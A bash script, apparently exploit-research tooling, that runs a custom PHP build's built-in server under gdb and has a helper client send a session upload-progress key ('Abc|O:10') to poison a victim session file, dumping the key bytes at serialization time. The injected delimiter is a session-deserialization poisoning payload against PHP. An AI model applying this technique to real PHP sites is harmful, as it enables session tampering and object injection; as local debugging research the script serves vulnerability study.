#!/bin/bash
# wp2_gdb.sh - gdb receipt: live poisoned key bytes in the session hash at encode time
# breaks in ps_srlzr_encode_php (static, -g build), dumps the key zend_string per iteration
CL=$(cd "$(dirname "$0")" && pwd)
DIR=/tmp/p2s_c2/gdb
SESS=$DIR/sess
PORT=18830
SID=vicsid00000000000000000000000
PHPBIN=/tmp/php8512_build/plain2/sapi/cli/php

rm -rf "$DIR"; mkdir -p "$SESS"
cat > "$DIR/php.ini" <<EOF
session.save_handler = files
session.save_path = "$SESS"
session.serialize_handler = php
session.use_strict_mode = 0
session.upload_progress.enabled = 1
session.upload_progress.prefix = "upload_progress_"
session.upload_progress.freq = 1
session.upload_progress.min_freq = 0
session.upload_progress.cleanup = 1
session.gc_probability = 0
display_errors = 0
log_errors = 1
post_max_size = 64M
upload_max_filesize = 64M
EOF

cat > "$DIR/gdb.cmds" <<'EOF'
set pagination off
set confirm off
break ps_srlzr_encode_php
commands
silent
printf "=== encode enter: http_session_vars array ===\n"
set $ht = PS(http_session_vars)
# walk the hash via the _zv local of PS_ENCODE_LOOP if present; fallback: dump args
bt 3
continue
end
run
EOF

# simpler, deterministic: break on the warning path's zend function and dump the key
# use a conditional breakpoint on ps_srlzr_encode_php, then single-step to the memchr
cat > "$DIR/gdb.cmds" <<'EOF'
set pagination off
set confirm off
set $n = 0
break ps_srlzr_encode_php
commands
silent
set $n = $n + 1
if $n == 1
  printf "=== PS_SERIALIZER_ENCODE_FUNC(php) entered ===\n"
  bt 6
end
if $n > 6
  delete 1
end
continue
end
break php_error_docref
commands
silent
printf "=== php_error_docref hit ===\n"
bt 8
frame 1
info locals
printf "=== key zend_string: len=%u ===\n", key->len
x/48bx key->val
continue
end
run
EOF

printf 'pref|s:6:"keepme";' > "$SESS/sess_$SID"

gdb -batch -x "$DIR/gdb.cmds" --args "$PHPBIN" -c "$DIR/php.ini" -S 127.0.0.1:$PORT -t "$CL/docroot" \
  > "$DIR/gdb_out.log" 2>&1 &
GDBPID=$!
for i in $(seq 1 150); do curl -s -o /dev/null --max-time 1 "http://127.0.0.1:$PORT/up.php" && break; sleep 0.2; done

# poison: key = "Abc|O:10" hex
python3 "$CL/wp2_upclient.py" $PORT full $SID --key 4162637C4F3A3130 --filesize 4096 > "$DIR/client.log" 2>&1
sleep 1
kill $GDBPID 2>/dev/null; sleep 1; pkill -f "127.0.0.1:$PORT" 2>/dev/null
grep -A30 "php_error_docref hit" "$DIR/gdb_out.log" | head -60
echo "=== file after: $(stat -c %s "$SESS/sess_$SID" 2>/dev/null || echo -1) ==="
